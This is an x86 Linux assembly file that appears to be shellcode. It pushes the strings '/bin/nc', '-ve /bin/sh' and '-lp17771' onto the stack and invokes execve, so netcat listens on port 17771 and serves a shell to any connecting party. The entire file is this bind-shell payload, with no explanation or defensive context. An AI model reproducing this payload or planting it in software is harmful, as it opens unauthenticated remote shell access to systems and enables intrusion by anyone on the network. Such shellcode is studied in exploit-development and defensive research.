global _start
section .text
 _start:
    xor edx, edx
    push edx
    push 0x31373737     ; -lp17771
    push 0x31706c2d
    mov eax, esp

    push edx
    push 0x68732f2f     ; -ve/bin///sh
    push 0x2f6e6962
    push 0x2f65762d
    mov esi, esp

    push edx
    push 0x636e2f6e     ;//bin/nc
    push 0x69622f2f
    mov ebx, esp

    push edx
    push eax
    push esi
    push ebx
    mov ecx, esp
    push byte 11
    pop eax
    int 0x80
